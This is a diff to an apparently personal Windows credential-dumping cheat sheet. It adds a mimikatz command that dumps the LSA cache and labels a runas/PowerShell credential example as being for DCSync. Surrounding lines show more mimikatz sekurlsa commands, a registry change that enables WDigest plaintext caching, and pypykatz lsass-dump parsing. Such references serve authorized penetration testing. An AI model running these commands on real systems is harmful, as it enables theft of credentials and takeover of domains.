@@ -45,6 +45,12 @@ cd C:\Temp\mimikatz\
 C:\Temp\mimikatz\mimikatz.exe "privilege::debug" "log sekurlsa.log" "sekurlsa::wdigest" exit
 ```
 
+LSA cache
+
+```cmd
+C:\Temp\mimikatz\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::cache" exit
+```
+
 ### Enabling wgigest
 
 ```bash
@@ -64,7 +70,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 runas /noprofile /user:<DOMAIN>\<USER> C:\Temp\mimikatz\mimikatz.exe
 ```
 
-OR
+OR (example for DCSync)
 
 ```powershell
 $SecPassword = ConvertTo-SecureString '<PWD>' -AsPlainText -Force
@@ -84,3 +90,4 @@ pypykatz lsa minidump --grep lsass.DMP
 
 - [wdigest](https://www.hackingarticles.in/credential-dumping-wdigest/)
 - [-wdigest-exploration](https://www.jimmwayans.com/mimikatz-exploration-wdigest/)
+- [ERROR kuhl_m_sekurlsa_acquireLSA ; Key import](https://github.com/gentilkiwi/mimikatz/issues/248)
